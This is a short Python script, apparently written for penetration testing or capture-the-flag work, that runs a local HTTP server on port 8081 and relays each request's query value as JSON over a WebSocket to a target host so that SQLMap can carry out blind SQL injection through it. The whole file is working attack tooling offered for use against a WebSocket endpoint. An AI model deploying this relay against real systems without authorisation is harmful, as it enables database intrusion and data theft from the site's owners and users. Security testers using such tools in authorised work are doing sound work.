#!/usr/bin/python3

"""
author: otter ʕ •ᴥ•ʔ

This script sets up a middleware server, it can be used to perform blind
SQLi with SQLMap over a WebSocket by redirecting all the traffic to the WS address.
"""

from http.server import SimpleHTTPRequestHandler
from socketserver import TCPServer
from urllib.parse import unquote, urlparse
from websocket import create_connection

ws_server = "ws://website.com:8080"


def send_ws(payload):
    ws = create_connection(ws_server)

    # replacing " with ' to avoid breaking JSON structure
    message = unquote(payload).replace('"', '\'')
    data = '{"id":"%s"}' % message

    ws.send(data)
    resp = ws.recv()
    ws.close()

    if resp:
        return resp
    else:
        return ''


def middleware_server(host_port, content_type="text/plain"):

    class CustomHandler(SimpleHTTPRequestHandler):
        def do_GET(self) -> None:
            self.send_response(200)
            try:
                payload = urlparse(self.path).query.split('=', 1)[1]
            except IndexError:
                payload = False

            if payload:
                content = send_ws(payload)
            else:
                content = 'No parameters specified!'

            self.send_header("Content-type", content_type)
            self.end_headers()
            self.wfile.write(content.encode())
            return

    class _TCPServer(TCPServer):
        allow_reuse_address = True

    httpd = _TCPServer(host_port, CustomHandler)
    httpd.serve_forever()


print("[+] Starting Middleware Server")
print("[+] Send payloads in http://localhost:8081")

try:
    middleware_server(('0.0.0.0', 8081))
except KeyboardInterrupt:
    pass
